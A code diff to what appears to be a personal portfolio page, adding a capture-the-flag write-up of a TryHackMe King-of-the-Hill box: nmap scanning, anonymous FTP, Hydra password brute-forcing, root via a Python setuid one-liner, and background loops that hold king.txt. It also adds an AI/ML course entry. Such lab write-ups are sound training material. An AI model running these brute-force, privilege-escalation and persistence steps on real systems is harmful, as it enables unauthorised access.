@@ -3284,6 +3284,158 @@ sh-4.2# /tmp/defend.sh
                   root@ip-10-10-255-50:~# id
                   uid=0(root) gid=0(root) groups=0(root),1002(neville)`,
         },
+        {
+          title: "Hackers",
+          desc: "Anonymous FTP leaked a user list, then Hydra cracked SSH/FTP creds for a quick foothold on \"Ellingson Mineral Company\"; a SUID Python 3.6 binary gave instant root, followed by a live tug-of-war defending king.txt with a background inotify watcher and a bind-mount trick.",
+          tags: ["Linux", "FTP", "Hydra", "KoTH"],
+          log: String.raw`┌──(root㉿kali)-[/home/kali]
+                  └─# nmap -p- -T5 --min-rate 5000 -Pn -A 10.10.145.22
+                  Starting Nmap 7.98 ( https://nmap.org )
+                  Nmap scan report for 10.10.145.22
+                  Host is up (0.26s latency).
+                  Not shown: 46407 closed tcp ports (reset), 19124 filtered tcp ports (no-response)
+                  PORT     STATE SERVICE VERSION
+                  21/tcp   open  ftp     vsftpd 2.0.8 or later
+                  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+                  |_-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
+                  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+                  80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+                  |_http-title: Ellingson Mineral Company
+                  9999/tcp open  http    Golang net/http server
+                  Service Info: Host: Ellingson; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ftp 10.10.145.22
+                  220-Ellingson Mineral Company FTP Server
+                  Name (10.10.145.22:kali): anonymous
+                  230 Login successful.
+                  ftp> ls -la
+                  -rw-r--r--    1 ftp      ftp            38 Apr 30  2020 .flag
+                  -rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
+                  ftp> bye
+
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# printf 'rcampbell\ngcrawford\n' > users.txt
+
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 64 ftp://10.10.145.22
+                  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 64 ssh://10.10.145.22
+                  [DATA] attacking ftp://10.10.145.22:21/
+                  [21][ftp] host: 10.10.145.22   login: rcampbell   password: [REDACTED]
+
+                  [DATA] attacking ssh://10.10.145.22:22/
+                  [22][ssh] host: 10.10.145.22   login: rcampbell   password: [REDACTED]
+                  1 of 1 target successfully completed, 1 valid password found
+
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ftp 10.10.145.22
+                  Name (10.10.145.22:kali): rcampbell
+                  230 Login successful.
+                  ftp> ls -la
+                  -r--------    1 ftp      ftp            38 Apr 30  2020 .flag
+                  ftp> get .flag
+                  226 Transfer complete.
+                  ftp>
+
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# cat .flag
+                  [REDACTED]
+
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ssh rcampbell@10.10.145.22
+                  rcampbell@10.10.145.22's password:
+                  rcampbell@gibson:~$ sudo -l
+                  [sudo] password for rcampbell:
+                  Sorry, user rcampbell may not run sudo on gibson.
+                  rcampbell@gibson:~$ /bin/bash -i -p
+                  rcampbell@gibson:~$ id
+                  uid=1002(rcampbell) gid=1002(rcampbell) groups=1002(rcampbell)
+                  rcampbell@gibson:~$ bash -i -p
+                  rcampbell@gibson:~$ python3 -c 'import os, pty; os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")'
+                  Traceback (most recent call last):
+                    File "<string>", line 1, in <module>
+                  PermissionError: [Errno 1] Operation not permitted
+                  rcampbell@gibson:~$ sudo openssl enc -in source
+                  [sudo] password for rcampbell:
+                  rcampbell is not in the sudoers file.  This incident will be reported.
+                  rcampbell@gibson:~$ sudo pico
+                  [sudo] password for rcampbell:
+                  rcampbell is not in the sudoers file.  This incident will be reported.
+                  rcampbell@gibson:~$ /usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+                  # id
+                  uid=0(root) gid=1002(rcampbell) groups=1002(rcampbell)
+                  # echo 0x7f3a > /root/king.txt
+                  # which chattr
+                  # chattr --help
+                  /bin/sh: 4: chattr: not found
+                  # /usr/bin/chattr +ia /root/king.txt
+                  /bin/sh: 5: /usr/bin/chattr: not found
+                  # (inotifywait -m -e modify,attrib,close_write,moved_to,create,delete /root/king.txt 2>/dev/null | while read; do
+                      echo "0x7f3a" >> /root/king.txt
+                  done) &
+
+                  # bind mount watcher
+                  (while true; do
+                      mount | grep -q king.txt || {
+                          mount --bind /root/king.txt /root/king.txt 2>/dev/null
+                          mount -o remount,ro,bind /root/king.txt 2>/dev/null
+                      }
+                      sleep 2
+                  done) &
+
+                  echo "both running"
+                  ps aux | grep -E "inotify|defend"> > # # # > > > > > > # # both running
+                  /bin/sh: 6: read: arg count
+
+                  root      4751  0.0  0.0  13136  1000 pts/0    S+   07:38   0:00 grep -E inotify|defend
+                  [1] - Done                       (inotifywait -m -e modify,attrib,close_write,moved_to,create,delete /root/king.txt 2>/dev/null | while read; do echo "0x7f3a" 1>>/root/king.txt; done)
+                  # cat /root/king.txt;echo
+                  0x7f3a
+
+                  # cat /root/.flag
+                  [REDACTED]
+                  # cat /home/gcrawford/business.txt
+                  Remember to send the accounts to Rich by 5pm Friday.
+
+                  Remember to change my password, before the meeting with Mr Belford.
+                  I hope he doesn't fire me. I need to provide for my family
+                  I need to send Ben the flag too, [REDACTED]
+                  # cat /home/tryhackme/.flag
+                  [REDACTED]
+                  # cat /home/rcampbell/.flag
+                  [REDACTED]
+                  # cat /home/production/.flag
+                  [REDACTED]
+                  # cat /home/production/webserver/resources/main.css
+                  /* Curious one, aren't you? Have a flag. [REDACTED] */
+                  # cat /var/ftp/.flag
+                  [REDACTED]
+                  # cat /etc/vsftpd.conf
+                  listen=NO
+                  anonymous_enable=YES
+                  local_enable=YES
+                  local_umask=022
+                  chroot_local_user=YES
+                  allow_writeable_chroot=YES
+                  banner_file=/etc/vsftpd/banner
+                  # [REDACTED]
+                  anon_root=/var/ftp
+                  hide_ids=YES
+                  # cat /etc/ssh/sshd_config
+                  # [REDACTED]
+                  PubkeyAuthentication yes
+                  X11Forwarding yes
+                  PrintMotd no
+                  UsePAM yes
+                  Banner /etc/ssh/ssh_banner
+                  AcceptEnv LANG LC_*
+                  Subsystem sftp  /usr/lib/openssh/sftp-server
+                  PasswordAuthentication yes
+
+                  Match User gcrawford
+                          PasswordAuthentication no
+                  #`,
+        },
       ];
 
       /* Example:
@@ -3342,6 +3494,14 @@ sh-4.2# /tmp/defend.sh
               label: "SQL for Data Science (Simplilearn)",
               href: "https://simpli-web.app.link/e/fuEBB2vra7b",
             },
+          ],
+        },
+        {
+          title: "AI/ML",
+          desc: "Exploring artificial intelligence and machine learning fundamentals \u2014 model design, training pipelines, and applying ML concepts alongside security work.",
+          tags: ["AI", "ML"],
+          links: [
+            { label: "CS50 AI/ML (in progress...)" },
           ],
         },
       ];
